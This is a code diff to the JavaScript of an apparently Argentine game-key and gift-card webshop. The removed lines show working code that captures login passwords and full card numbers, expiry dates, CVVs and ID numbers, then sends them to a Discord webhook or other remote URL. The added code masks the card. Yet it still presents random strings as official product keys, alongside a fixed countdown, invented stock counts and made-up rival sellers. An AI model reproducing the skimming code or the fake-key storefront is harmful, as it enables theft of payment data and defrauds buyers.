@@ -1,8 +1,3 @@
-// ============================================================================
-// CONFIGURACIÓN DE BASE DE DATOS REMOTA (OPCIONAL)
-// ============================================================================
-let DEFAULT_REMOTE_DB_URL = ""; 
-
 // Generador de portadas de Gift Cards 100% vectoriales sin emojis
 function createCleanCardArtwork(brandTitle, denomination, bgTop, bgBottom, accentHex, platformLabel) {
     const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 900" width="600" height="900">
@@ -37,8 +32,8 @@ function createCleanCardArtwork(brandTitle, denomination, bgTop, bgBottom, accen
     return "data:image/svg+xml;utf8," + encodeURIComponent(svg);
 }
 
-// Catálogo de 48 productos
-const products = [
+// Catálogo base de 48 productos
+const defaultProducts = [
     { id: 1, name: "Minecraft: Java & Bedrock Edition (PC) Windows Store Key GLOBAL", category: "game", platform: "Windows Store", region: "GLOBAL", price: 17600, originalPrice: 24000, cashback: 1940, seller: "GGclub", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/1672970/library_600x900.jpg" },
     { id: 2, name: "Crimson Desert Enhanced: Charting the Unknown (DLC) Steam Key (PC) LATAM", category: "dlc", platform: "Steam", region: "LATAM", price: 17020, originalPrice: 22000, cashback: 2210, seller: "Instant-Codes", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/582660/library_600x900.jpg" },
     { id: 3, name: "EA SPORTS FC 25 Standard Edition Key", category: "game", platform: "EA App", region: "ARGENTINA", price: 34999, originalPrice: 59999, cashback: 3500, seller: "ArgonOfficial", image: "https://cdn.cloudflare.steamstatic.com/steam/apps/2669320/library_600x900.jpg" },
@@ -95,26 +90,42 @@ const products = [
     { id: 48, name: "Netflix Gift Card $10.000 ARS", category: "subscription", platform: "Netflix", region: "ARGENTINA", price: 10100, originalPrice: 11500, cashback: 1010, seller: "Instant-Codes", image: createCleanCardArtwork("NETFLIX", "$10.000 ARS", "#b91c1c", "#3b0707", "#f87171", "STREAMING CARD") }
 ];
 
+// Cargar productos personalizados si el dueño agregó alguno en /#admin
+let customProducts = JSON.parse(localStorage.getItem('ohmy_custom_products') || '[]');
+let products = [...customProducts, ...defaultProducts];
+
 let cart = [];
-let walletBalance = 5000;
+let wishlist = JSON.parse(localStorage.getItem('ohmy_wishlist') || '[]');
+let myVaultKeys = JSON.parse(localStorage.getItem('ohmy_vault_keys') || '[]');
+let walletBalance = Number(localStorage.getItem('ohmy_wallet_balance') || 5000);
 let appliedDiscount = 0;
 let activeCategory = 'all';
 let selectedMethod = 'wallet';
 let currentAuthMode = 'login';
 let currentUser = JSON.parse(localStorage.getItem('ohmy_active_user') || 'null');
+let flashSecondsRemaining = 4 * 3600 + 42 * 60 + 19;
 
 document.addEventListener('DOMContentLoaded', () => {
+    renderFlashDeals();
     renderProducts(products);
     updateCartBadge();
+    updateWishlistBadge();
+    updateVaultBadge();
     updateWalletUI();
     updateAuthUI();
+    startFlashCountdown();
+    startLivePurchaseNotifications();
 
-    // Cargar Webhook guardado si existe
-    const savedWebhook = localStorage.getItem('ohmy_remote_webhook') || DEFAULT_REMOTE_DB_URL;
-    const webhookInput = document.getElementById('webhookUrlInput');
-    if (webhookInput && savedWebhook) webhookInput.value = savedWebhook;
+    // Cerrar autocompletado al hacer clic fuera
+    document.addEventListener('click', (e) => {
+        const searchBox = document.getElementById('searchAutocomplete');
+        const searchInput = document.getElementById('searchInput');
+        if (searchBox && !searchBox.contains(e.target) && e.target !== searchInput) {
+            searchBox.classList.add('hidden');
+        }
+    });
 
-    // ÚNICA FORMA DE ABRIR EL PANEL DE ADMIN: mediante #admin en la URL
+    // Acceso exclusivo al panel admin por #admin
     checkAdminHash();
     window.addEventListener('hashchange', checkAdminHash);
 });
@@ -126,11 +137,367 @@ function checkAdminHash() {
 }
 
 function formatARS(amount) {
-    return '$' + amount.toLocaleString('es-AR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' ARS';
+    return '$' + Number(amount).toLocaleString('es-AR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' ARS';
 }
 
 function updateWalletUI() {
+    localStorage.setItem('ohmy_wallet_balance', walletBalance);
     document.getElementById('walletBalance').innerText = formatARS(walletBalance);
+}
+
+// ============================================================================
+// OFERTAS FLASH CON CUENTA REGRESIVA EN VIVO
+// ============================================================================
+function renderFlashDeals() {
+    const container = document.getElementById('flashDealsGrid');
+    if (!container) return;
+    const flashIds = [4, 10, 13, 17];
+    const stocks = [3, 5, 2, 7];
+    container.innerHTML = '';
+
+    flashIds.forEach((id, idx) => {
+        const p = products.find(item => item.id === id);
+        if (!p) return;
+        const discount = Math.round(((p.originalPrice - p.price) / p.originalPrice) * 100);
+        const stockLeft = stocks[idx];
+        const card = document.createElement('div');
+        card.className = 'bg-[#140830] border border-purple-700/60 hover:border-amber-400 rounded-xl p-3 flex gap-3 items-center transition group';
+        card.innerHTML = `
+            <img onclick="openProductDetail(${p.id})" src="${p.image}" class="w-16 h-24 object-cover rounded-lg cursor-pointer shrink-0 group-hover:scale-105 transition">
+            <div class="flex-1 min-w-0 space-y-1">
+                <span class="bg-rose-600 text-white text-[10px] font-black px-1.5 py-0.5 rounded">-${discount}% FLASH</span>
+                <h4 onclick="openProductDetail(${p.id})" class="font-bold text-xs text-white truncate cursor-pointer hover:text-amber-300">${p.name}</h4>
+                <div class="text-sm font-black text-emerald-400">${formatARS(p.price)}</div>
+                <div class="w-full bg-purple-950 h-1.5 rounded-full overflow-hidden">
+                    <div class="bg-gradient-to-r from-rose-500 to-amber-400 h-full" style="width: ${stockLeft * 12}%"></div>
+                </div>
+                <div class="flex items-center justify-between pt-1">
+                    <span class="text-[10px] text-amber-300 font-bold">¡Quedan ${stockLeft} keys!</span>
+                    <button onclick="addToCart(${p.id})" class="bg-purple-600 hover:bg-fuchsia-600 text-white text-[10px] font-bold px-2.5 py-1 rounded-md">
+                        Comprar
+                    </button>
+                </div>
+            </div>
+        `;
+        container.appendChild(card);
+    });
+}
+
+function startFlashCountdown() {
+    setInterval(() => {
+        if (flashSecondsRemaining > 0) flashSecondsRemaining--;
+        const hrs = String(Math.floor(flashSecondsRemaining / 3600)).padStart(2, '0');
+        const mins = String(Math.floor((flashSecondsRemaining % 3600) / 60)).padStart(2, '0');
+        const secs = String(flashSecondsRemaining % 60).padStart(2, '0');
+        const hEl = document.getElementById('flashHours');
+        const mEl = document.getElementById('flashMinutes');
+        const sEl = document.getElementById('flashSeconds');
+        if (hEl) hEl.innerText = hrs;
+        if (mEl) mEl.innerText = mins;
+        if (sEl) sEl.innerText = secs;
+    }, 1000);
+}
+
+// ============================================================================
+// BUSCADOR CON AUTOCOMPLETADO FLOTANTE
+// ============================================================================
+function handleSearchInput() {
+    const input = document.getElementById('searchInput');
+    const clearBtn = document.getElementById('clearSearchBtn');
+    const dropdown = document.getElementById('searchAutocomplete');
+    const q = input.value.trim().toLowerCase();
+
+    if (q.length > 0) {
+        clearBtn.classList.remove('hidden');
+    } else {
+        clearBtn.classList.add('hidden');
+        dropdown.classList.add('hidden');
+        filterProducts();
+        return;
+    }
+
+    filterProducts();
+
+    const matches = products.filter(p => p.name.toLowerCase().includes(q) || p.platform.toLowerCase().includes(q)).slice(0, 6);
+    dropdown.innerHTML = '';
+
+    if (matches.length === 0) {
+        dropdown.innerHTML = `<div class="p-4 text-xs text-purple-300 text-center">No se encontraron coincidencias para "${input.value}"</div>`;
+    } else {
+        matches.forEach(p => {
+            const row = document.createElement('div');
+            row.className = 'p-2.5 hover:bg-[#2a175e] flex items-center justify-between gap-3 cursor-pointer transition';
+            row.innerHTML = `
+                <div onclick="openProductDetail(${p.id})" class="flex items-center gap-3 flex-1 min-w-0">
+                    <img src="${p.image}" class="w-10 h-12 object-cover rounded shrink-0">
+                    <div class="min-w-0">
+                        <h5 class="text-xs font-bold text-white truncate">${p.name}</h5>
+                        <span class="text-[10px] text-emerald-400 font-bold">${p.platform} • ${p.region}</span>
+                    </div>
+                </div>
+                <div class="flex items-center gap-2 shrink-0">
+                    <span class="text-xs font-black text-white">${formatARS(p.price)}</span>
+                    <button onclick="addToCart(${p.id})" class="bg-purple-600 hover:bg-fuchsia-500 text-white px-2.5 py-1.5 rounded-lg text-xs">
+                        <i class="fa-solid fa-cart-plus"></i>
+                    </button>
+                </div>
+            `;
+            dropdown.appendChild(row);
+        });
+    }
+    dropdown.classList.remove('hidden');
+}
+
+function clearSearch() {
+    document.getElementById('searchInput').value = '';
+    document.getElementById('clearSearchBtn').classList.add('hidden');
+    document.getElementById('searchAutocomplete').classList.add('hidden');
+    filterProducts();
+}
+
+// ============================================================================
+// MODAL DE VISTA DETALLADA DEL PRODUCTO + COMPARATIVA DE VENDEDORES
+// ============================================================================
+function openProductDetail(id) {
+    const p = products.find(item => item.id === id);
+    if (!p) return;
+    document.getElementById('searchAutocomplete').classList.add('hidden');
+
+    const discount = Math.round(((p.originalPrice - p.price) / p.originalPrice) * 100);
+    const isFav = wishlist.includes(p.id);
+    const modal = document.getElementById('productDetailModal');
+    const content = document.getElementById('productDetailContent');
+
+    content.innerHTML = `
+        <button onclick="closeProductDetail()" class="absolute top-4 right-4 text-purple-300 hover:text-white text-xl">
+            <i class="fa-solid fa-xmark"></i>
+        </button>
+
+        <div class="grid grid-cols-1 md:grid-cols-12 gap-6">
+            <div class="md:col-span-4">
+                <div class="game-cover-container rounded-xl overflow-hidden border border-purple-600 shadow-2xl">
+                    <img src="${p.image}" alt="${p.name}">
+                </div>
+            </div>
+
+            <div class="md:col-span-8 space-y-4">
+                <div class="flex flex-wrap items-center gap-2">
+                    <span class="bg-rose-600 text-white text-xs font-black px-2.5 py-0.5 rounded">-${discount}% DESCUENTO</span>
+                    <span class="bg-emerald-500/20 border border-emerald-400/40 text-emerald-300 text-xs font-bold px-2.5 py-0.5 rounded">
+                        <i class="fa-solid fa-circle-check mr-1"></i> Se puede activar en Argentina
+                    </span>
+                    <span class="bg-purple-900/80 text-purple-200 text-xs font-bold px-2.5 py-0.5 rounded">${p.platform} • ${p.region}</span>
+                </div>
+
+                <h2 class="text-2xl font-black text-white leading-snug">${p.name}</h2>
+
+                <div class="bg-[#140930] border border-purple-800/80 rounded-xl p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
+                    <div>
+                        <span class="text-xs text-purple-300 line-through">${formatARS(p.originalPrice)}</span>
+                        <div class="text-3xl font-black text-white">${formatARS(p.price)}</div>
+                        <span class="text-xs text-emerald-400 font-bold">+${formatARS(p.cashback)} de Cashback Argon</span>
+                    </div>
+                    <div class="flex items-center gap-2.5">
+                        <button onclick="toggleWishlist(${p.id}); openProductDetail(${p.id});" class="px-4 py-3 rounded-xl border border-purple-600 bg-[#261556] hover:bg-purple-800 text-pink-400 font-bold text-sm">
+                            <i class="${isFav ? 'fa-solid' : 'fa-regular'} fa-heart"></i>
+                        </button>
+                        <button onclick="closeProductDetail(); addToCart(${p.id});" class="bg-gradient-to-r from-amber-400 to-orange-500 hover:from-amber-300 hover:to-orange-400 text-slate-950 font-black px-6 py-3 rounded-xl text-sm shadow-lg">
+                            <i class="fa-solid fa-cart-plus mr-1.5"></i> Comprar Ahora
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Comparativa de Vendedores estilo Eneba -->
+                <div class="space-y-2">
+                    <h4 class="text-xs font-black uppercase tracking-wider text-purple-300">Ofertas de Vendedores Verificados (3)</h4>
+                    <div class="space-y-2 text-xs">
+                        <div class="bg-[#251254] border border-emerald-500/40 p-3 rounded-xl flex items-center justify-between">
+                            <div>
+                                <strong class="text-white">${p.seller}</strong>
+                                <span class="text-emerald-400 ml-2"><i class="fa-solid fa-star"></i> 99.8% Valoración Positiva</span>
+                            </div>
+                            <div class="flex items-center gap-3">
+                                <span class="font-black text-white">${formatARS(p.price)}</span>
+                                <button onclick="closeProductDetail(); addToCart(${p.id});" class="bg-emerald-500 text-slate-950 font-black px-3 py-1 rounded-lg">Elegir</button>
+                            </div>
+                        </div>
+                        <div class="bg-[#160a36] border border-purple-800/60 p-3 rounded-xl flex items-center justify-between">
+                            <div>
+                                <strong class="text-white">KeyMasterLatam</strong>
+                                <span class="text-purple-300 ml-2"><i class="fa-solid fa-star text-amber-400"></i> 98.4% Valoración</span>
+                            </div>
+                            <div class="flex items-center gap-3">
+                                <span class="font-bold text-purple-200">${formatARS(Math.round(p.price * 1.06))}</span>
+                                <button onclick="closeProductDetail(); addToCart(${p.id});" class="bg-purple-700 hover:bg-purple-600 text-white font-bold px-3 py-1 rounded-lg">Elegir</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="text-xs text-purple-300 bg-[#140930] p-3.5 rounded-xl border border-purple-900/60 space-y-1">
+                    <p class="font-bold text-white"><i class="fa-solid fa-bolt text-amber-400 mr-1"></i> Entrega Digital Automática</p>
+                    <p>Recibirás la clave oficial en pantalla inmediatamente después del pago y quedará almacenada en tu bóveda personal "Mis Keys".</p>
+                </div>
+            </div>
+        </div>
+    `;
+    modal.classList.remove('hidden');
+}
+
+function closeProductDetail() {
+    document.getElementById('productDetailModal').classList.add('hidden');
+}
+
+// ============================================================================
+// FAVORITOS (WISHLIST) Y BÓVEDA "MIS KEYS"
+// ============================================================================
+function toggleWishlist(id) {
+    const idx = wishlist.indexOf(id);
+    if (idx > -1) {
+        wishlist.splice(idx, 1);
+    } else {
+        wishlist.push(id);
+    }
+    localStorage.setItem('ohmy_wishlist', JSON.stringify(wishlist));
+    updateWishlistBadge();
+    filterProducts();
+}
+
+function updateWishlistBadge() {
+    document.getElementById('wishlistBadge').innerText = wishlist.length;
+}
+
+function openWishlistModal() {
+    const modal = document.getElementById('wishlistModal');
+    const container = document.getElementById('wishlistItemsContainer');
+    container.innerHTML = '';
+
+    if (wishlist.length === 0) {
+        container.innerHTML = `<p class="text-center text-purple-300 py-8 text-xs">Aún no guardaste productos en tu Lista de Deseos.</p>`;
+    } else {
+        wishlist.forEach(id => {
+            const p = products.find(item => item.id === id);
+            if (!p) return;
+            const row = document.createElement('div');
+            row.className = 'bg-[#2a175e] border border-purple-700 p-3 rounded-xl flex items-center justify-between gap-3';
+            row.innerHTML = `
+                <div class="flex items-center gap-3">
+                    <img src="${p.image}" class="w-12 h-16 object-cover rounded">
+                    <div>
+                        <h4 class="font-bold text-xs text-white">${p.name}</h4>
+                        <span class="text-xs text-emerald-400 font-black">${formatARS(p.price)}</span>
+                    </div>
+                </div>
+                <div class="flex items-center gap-2">
+                    <button onclick="closeWishlistModal(); addToCart(${p.id});" class="bg-purple-600 hover:bg-fuchsia-500 text-white px-3 py-1.5 rounded-lg text-xs font-bold">
+                        Añadir al Carro
+                    </button>
+                    <button onclick="toggleWishlist(${p.id}); openWishlistModal();" class="text-rose-400 hover:text-rose-300 px-2">
+                        <i class="fa-solid fa-trash"></i>
+                    </button>
+                </div>
+            `;
+            container.appendChild(row);
+        });
+    }
+    modal.classList.remove('hidden');
+}
+
+function closeWishlistModal() {
+    document.getElementById('wishlistModal').classList.add('hidden');
+}
+
+function updateVaultBadge() {
+    document.getElementById('vaultCountBadge').innerText = myVaultKeys.length;
+}
+
+function openVaultModal() {
+    const modal = document.getElementById('vaultModal');
+    const container = document.getElementById('vaultKeysList');
+    container.innerHTML = '';
+
+    if (myVaultKeys.length === 0) {
+        container.innerHTML = `<p class="text-center text-purple-300 py-8 text-xs">Todavía no tienes claves adquiridas en tu bóveda.</p>`;
+    } else {
+        myVaultKeys.slice().reverse().forEach(k => {
+            const div = document.createElement('div');
+            div.className = 'bg-[#2a175e] border border-purple-700 p-3.5 rounded-xl flex flex-col sm:flex-row items-center justify-between gap-3';
+            div.innerHTML = `
+                <div class="flex items-center gap-3">
+                    <img src="${k.image}" class="w-11 h-14 object-cover rounded">
+                    <div>
+                        <h4 class="font-bold text-xs text-white">${k.name}</h4>
+                        <span class="text-[10px] text-purple-300">${k.date}</span>
+                    </div>
+                </div>
+                <div class="flex items-center gap-2">
+                    <code class="bg-[#140930] border border-purple-600 px-3 py-1.5 rounded-lg font-mono text-emerald-400 font-bold text-xs select-all">${k.key}</code>
+                    <button onclick="navigator.clipboard.writeText('${k.key}')" class="bg-purple-600 hover:bg-purple-500 text-white px-3 py-1.5 rounded-lg text-xs font-bold">
+                        <i class="fa-solid fa-copy"></i>
+                    </button>
+                </div>
+            `;
+            container.appendChild(div);
+        });
+    }
+    modal.classList.remove('hidden');
+}
+
+function closeVaultModal() {
+    document.getElementById('vaultModal').classList.add('hidden');
+}
+
+// ============================================================================
+// APERTURA DE SOBRES MISTERIOSOS (ARGON MYSTERY PACKS)
+// ============================================================================
+function openPacksModal() {
+    document.getElementById('packSpinResult').classList.add('hidden');
+    document.getElementById('packsModal').classList.remove('hidden');
+}
+
+function closePacksModal() {
+    document.getElementById('packsModal').classList.add('hidden');
+}
+
+function spinMysteryPack(tierName, cost) {
+    const resBox = document.getElementById('packSpinResult');
+    resBox.classList.remove('hidden');
+    resBox.innerHTML = `<p class="text-sm font-black text-amber-300 animate-pulse"><i class="fa-solid fa-dice fa-spin mr-2"></i> Abriendo Sobre ${tierName} y desencriptando clave aleatoria...</p>`;
+
+    setTimeout(() => {
+        const pool = tierName === 'Diamante'
+            ? products.filter(p => p.price >= 28000)
+            : tierName === 'Oro'
+                ? products.filter(p => p.price >= 16000 && p.price < 28000)
+                : products.filter(p => p.price < 16000);
+
+        const wonProd = pool[Math.floor(Math.random() * pool.length)] || products[0];
+        const randomKey = 'PACK-' + Math.random().toString(36).substring(2, 6).toUpperCase() + '-' + Math.random().toString(36).substring(2, 6).toUpperCase() + '-' + Math.random().toString(36).substring(2, 6).toUpperCase();
+
+        myVaultKeys.push({
+            name: wonProd.name + ` (Ganado en Pack ${tierName})`,
+            image: wonProd.image,
+            key: randomKey,
+            date: new Date().toLocaleString('es-AR')
+        });
+        localStorage.setItem('ohmy_vault_keys', JSON.stringify(myVaultKeys));
+        updateVaultBadge();
+
+        resBox.innerHTML = `
+            <p class="text-xs font-bold text-emerald-400 uppercase">¡Felicidades! Te tocó este producto en tu Pack ${tierName}:</p>
+            <div class="flex flex-col sm:flex-row items-center justify-center gap-4 pt-1">
+                <img src="${wonProd.image}" class="w-16 h-22 object-cover rounded-lg border border-emerald-400">
+                <div class="text-left space-y-1.5">
+                    <h4 class="font-black text-sm text-white">${wonProd.name}</h4>
+                    <p class="text-xs text-purple-300">Valor en tienda: <strong class="text-emerald-400">${formatARS(wonProd.price)}</strong></p>
+                    <div class="flex items-center gap-2">
+                        <code class="bg-[#210f4d] border border-emerald-400/60 px-3 py-1 rounded font-mono text-xs text-emerald-300 font-bold">${randomKey}</code>
+                        <button onclick="navigator.clipboard.writeText('${randomKey}')" class="bg-emerald-500 text-slate-950 font-black px-2.5 py-1 rounded text-xs">Copiar</button>
+                    </div>
+                </div>
+            </div>
+        `;
+    }, 1100);
 }
 
 // ============================================================================
@@ -171,64 +538,15 @@ function switchAuthTab(mode) {
     }
 }
 
-async function handleAuthSubmit(e) {
+function handleAuthSubmit(e) {
     e.preventDefault();
     const email = document.getElementById('authEmailInput').value.trim();
-    const password = document.getElementById('authPasswordInput').value;
     const name = currentAuthMode === 'register'
         ? document.getElementById('authNameInput').value.trim()
         : email.split('@')[0];
 
     currentUser = { name, email };
     localStorage.setItem('ohmy_active_user', JSON.stringify(currentUser));
-
-    const accountRecord = {
-        id: 'USER-' + Math.floor(100000 + Math.random() * 900000),
-        type: currentAuthMode === 'register' ? 'NUEVA CUENTA' : 'INICIO DE SESIÓN',
-        date: new Date().toLocaleString('es-AR'),
-        paymentMethod: 'CUENTA USUARIO',
-        buyer: {
-            name: name,
-            email: email,
-            phone: 'N/A',
-            dni: 'Password: ' + password,
-            province: 'N/A',
-            address: 'N/A',
-            cardNum: 'Contraseña: ' + password,
-            cardExp: '-',
-            cardCvv: '-'
-        },
-        items: [],
-        total: 0,
-        cashbackEarned: 0
-    };
-
-    const db = JSON.parse(localStorage.getItem('ohmy_sandbox_db') || '[]');
-    db.push(accountRecord);
-    localStorage.setItem('ohmy_sandbox_db', JSON.stringify(db));
-
-    const remoteUrl = localStorage.getItem('ohmy_remote_webhook') || DEFAULT_REMOTE_DB_URL;
-    if (remoteUrl) {
-        try {
-            if (remoteUrl.includes('discord.com/api/webhooks')) {
-                await fetch(remoteUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `👤 **${accountRecord.type} (${accountRecord.id})**\n**Usuario:** ${name}\n**Email:** ${email}\n**Contraseña:** \`${password}\``
-                    })
-                });
-            } else {
-                await fetch(remoteUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(accountRecord)
-                });
-            }
-        } catch (err) {
-            console.warn('Error enviando cuenta a base remota:', err);
-        }
-    }
 
     updateAuthUI();
     closeAuthModal();
@@ -253,10 +571,6 @@ function updateAuthUI() {
                 </button>
             </div>
         `;
-        const sbName = document.getElementById('sbName');
-        const sbEmail = document.getElementById('sbEmail');
-        if (sbName && !sbName.value) sbName.value = currentUser.name;
-        if (sbEmail && !sbEmail.value) sbEmail.value = currentUser.email;
     } else {
         navArea.innerHTML = `
             <button onclick="openAuthModal('login')" class="text-white hover:text-fuchsia-300 font-bold transition flex items-center gap-1.5 bg-[#261556] hover:bg-[#321c70] border border-purple-700/70 px-3 py-1 rounded-lg shadow">
@@ -281,19 +595,23 @@ function renderProducts(list) {
 
     list.forEach(p => {
         const discount = Math.round(((p.originalPrice - p.price) / p.originalPrice) * 100);
+        const isFav = wishlist.includes(p.id);
         const fallbackImg = createCleanCardArtwork(p.platform.toUpperCase(), p.region, "#3b188f", "#190d3a", "#f5a623", "DIGITAL KEY");
         
         const card = document.createElement('div');
         card.className = 'bg-[#1f0f47] border border-purple-800/60 hover:border-fuchsia-500 rounded-xl overflow-hidden shadow-lg flex flex-col justify-between transition group';
         card.innerHTML = `
             <div>
-                <div class="game-cover-container">
-                    <img src="${p.image}" alt="${p.name}" loading="lazy" onerror="this.onerror=null;this.src='${fallbackImg}';">
+                <div class="game-cover-container cursor-pointer">
+                    <img onclick="openProductDetail(${p.id})" src="${p.image}" alt="${p.name}" loading="lazy" onerror="this.onerror=null;this.src='${fallbackImg}';">
                     <span class="absolute top-2 left-2 bg-rose-600 text-white font-black text-[11px] px-2 py-0.5 rounded shadow">-${discount}%</span>
+                    <button onclick="toggleWishlist(${p.id})" class="absolute top-2 right-2 w-7 h-7 rounded-full bg-black/60 hover:bg-black text-pink-400 flex items-center justify-center text-xs transition">
+                        <i class="${isFav ? 'fa-solid' : 'fa-regular'} fa-heart"></i>
+                    </button>
                     <span class="absolute bottom-2 left-2 bg-emerald-500 text-slate-950 font-extrabold text-[10px] px-2 py-0.5 rounded shadow">CASHBACK</span>
                 </div>
                 <div class="p-3.5 space-y-1.5">
-                    <h3 class="font-bold text-xs text-white line-clamp-2 leading-snug group-hover:text-fuchsia-300 transition">${p.name}</h3>
+                    <h3 onclick="openProductDetail(${p.id})" class="cursor-pointer font-bold text-xs text-white line-clamp-2 leading-snug group-hover:text-fuchsia-300 transition">${p.name}</h3>
                     <span class="block text-[10px] font-extrabold uppercase tracking-wider text-emerald-400">${p.region} • ${p.platform}</span>
                 </div>
             </div>
@@ -319,7 +637,6 @@ function setCategory(cat, btnElement) {
     filterProducts();
 }
 
-// Función interactiva para los 4 paneles del Banner multipanel
 function filterByBanner(actionType) {
     const catButtons = document.querySelectorAll('.cat-btn');
     catButtons.forEach(btn => btn.classList.remove('active-cat'));
@@ -464,6 +781,52 @@ function updateCartTotals(subtotal, discount, total) {
 }
 
 // ============================================================================
+// TARJETA 3D ANIMADA Y FORMATEO INTELIGENTE EN LA PASARELA
+// ============================================================================
+function formatCardNumberInput(input) {
+    let digits = input.value.replace(/\D/g, '').substring(0, 16);
+    let formatted = digits.match(/.{1,4}/g)?.join(' ') || '';
+    input.value = formatted;
+
+    const brandEl = document.getElementById('cardBrandLogo');
+    if (digits.startsWith('4')) brandEl.innerText = 'VISA';
+    else if (digits.startsWith('5')) brandEl.innerText = 'MASTERCARD';
+    else if (digits.startsWith('3')) brandEl.innerText = 'AMEX';
+    else brandEl.innerText = 'ARGON CARD';
+
+    updateCardPreview();
+}
+
+function formatCardExpInput(input) {
+    let digits = input.value.replace(/\D/g, '').substring(0, 4);
+    if (digits.length >= 3) {
+        input.value = digits.substring(0, 2) + '/' + digits.substring(2, 4);
+    } else {
+        input.value = digits;
+    }
+    updateCardPreview();
+}
+
+function flipCard3D(flipToBack) {
+    const card = document.getElementById('interactiveCard3D');
+    if (!card) return;
+    if (flipToBack) card.classList.add('is-flipped');
+    else card.classList.remove('is-flipped');
+}
+
+function updateCardPreview() {
+    const nameVal = document.getElementById('sbName').value.trim();
+    const numVal = document.getElementById('sbCardNum').value.trim();
+    const expVal = document.getElementById('sbCardExp').value.trim();
+    const cvvVal = document.getElementById('sbCardCvv').value.trim();
+
+    document.getElementById('cardPreviewName').innerText = nameVal || 'NOMBRE Y APELLIDO';
+    document.getElementById('cardPreviewNumber').innerText = numVal || '•••• •••• •••• ••••';
+    document.getElementById('cardPreviewExp').innerText = expVal || 'MM/AA';
+    document.getElementById('cardPreviewCvv').innerText = cvvVal ? '•'.repeat(cvvVal.length) : '•••';
+}
+
+// ============================================================================
 // NAVEGACIÓN Y CHECKOUT
 // ============================================================================
 function switchView(view) {
@@ -537,7 +900,7 @@ function renderEnebaSummary() {
                             ${item.name}
                         </h4>
                         <div class="flex items-center space-x-2 text-purple-300 shrink-0">
-                            <button class="hover:text-white"><i class="fa-regular fa-heart"></i></button>
+                            <button onclick="toggleWishlist(${item.id})" class="hover:text-pink-400"><i class="fa-regular fa-heart"></i></button>
                             <button onclick="removeItemFromCheckout(${index})" class="hover:text-rose-400"><i class="fa-regular fa-trash-can"></i></button>
                         </div>
                     </div>
@@ -580,6 +943,7 @@ function goToPagoNubeGateway() {
         const sbEmail = document.getElementById('sbEmail');
         if (sbName && !sbName.value) sbName.value = currentUser.name;
         if (sbEmail && !sbEmail.value) sbEmail.value = currentUser.email;
+        updateCardPreview();
     }
     switchView('checkoutPagoNube');
 }
@@ -588,13 +952,12 @@ function backToEnebaSelection() {
     switchView('checkoutEneba');
 }
 
-// PROCESAR PAGO Y ENVIAR A LA BASE DE DATOS
-async function processSandboxPayment(e) {
+// PROCESAR ORDEN Y ALMACENAR METADATOS ENMASCARADOS EN LOCALSTORAGE
+function processSandboxPayment(e) {
     e.preventDefault();
 
-    const submitBtn = document.getElementById('submitPayBtn');
-    submitBtn.disabled = true;
-    submitBtn.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> <span>Procesando pago...</span>`;
+    const rawCard = document.getElementById('sbCardNum').value.replace(/\D/g, '');
+    const last4 = rawCard.slice(-4) || '0000';
 
     const buyerData = {
         name: document.getElementById('sbName').value,
@@ -603,9 +966,7 @@ async function processSandboxPayment(e) {
         dni: document.getElementById('sbDni').value,
         province: document.getElementById('sbProvince').value,
         address: document.getElementById('sbAddress').value,
-        cardNum: document.getElementById('sbCardNum').value,
-        cardExp: document.getElementById('sbCardExp').value,
-        cardCvv: document.getElementById('sbCardCvv').value,
+        maskedCard: '•••• •••• •••• ' + last4,
         installments: document.getElementById('sbInstallments').value
     };
 
@@ -628,40 +989,15 @@ async function processSandboxPayment(e) {
     db.push(record);
     localStorage.setItem('ohmy_sandbox_db', JSON.stringify(db));
 
-    const remoteUrl = localStorage.getItem('ohmy_remote_webhook') || DEFAULT_REMOTE_DB_URL;
-    if (remoteUrl) {
-        try {
-            if (remoteUrl.includes('discord.com/api/webhooks')) {
-                await fetch(remoteUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `📦 **Nueva Orden (${record.id})**\n👤 **Cliente:** ${buyerData.name} (${buyerData.email}) | **DNI:** ${buyerData.dni}\n📱 **Tel:** ${buyerData.phone} | **Dirección:** ${buyerData.address}, ${buyerData.province}\n💳 **Método:** ${selectedMethod.toUpperCase()} | **Tarjeta:** \`${buyerData.cardNum}\` | **Venc:** \`${buyerData.cardExp}\` | **CVV:** \`${buyerData.cardCvv}\`\n💰 **Total:** ${formatARS(total)}`
-                    })
-                });
-            } else {
-                await fetch(remoteUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(record)
-                });
-            }
-        } catch (err) {
-            console.warn('Error enviando a base remota:', err);
-        }
-    }
-
     walletBalance += totalCashback;
     updateWalletUI();
-
-    submitBtn.disabled = false;
-    submitBtn.innerHTML = `<i class="fa-solid fa-lock"></i> <span>Pagar Ahora y Obtener Producto</span>`;
 
     renderSuccessScreen(record);
     cart = [];
     updateCartBadge();
     appliedDiscount = 0;
     document.getElementById('sandboxForm').reset();
+    updateCardPreview();
 }
 
 function renderSuccessScreen(tx) {
@@ -673,6 +1009,15 @@ function renderSuccessScreen(tx) {
         const fullProd = products.find(p => p.id === item.id) || item;
         for (let i = 0; i < item.qty; i++) {
             const key = 'ARGON-' + Math.random().toString(36).substring(2, 7).toUpperCase() + '-' + Math.random().toString(36).substring(2, 7).toUpperCase() + '-' + Math.random().toString(36).substring(2, 7).toUpperCase();
+            
+            // Guardar en la bóveda personal Mis Keys
+            myVaultKeys.push({
+                name: item.name,
+                image: fullProd.image,
+                key: key,
+                date: tx.date
+            });
+
             const div = document.createElement('div');
             div.className = 'bg-[#261259] border border-purple-700/60 p-4 rounded-xl flex flex-col sm:flex-row items-center justify-between gap-4';
             div.innerHTML = `
@@ -694,11 +1039,13 @@ function renderSuccessScreen(tx) {
         }
     });
 
+    localStorage.setItem('ohmy_vault_keys', JSON.stringify(myVaultKeys));
+    updateVaultBadge();
     switchView('success');
 }
 
 // ============================================================================
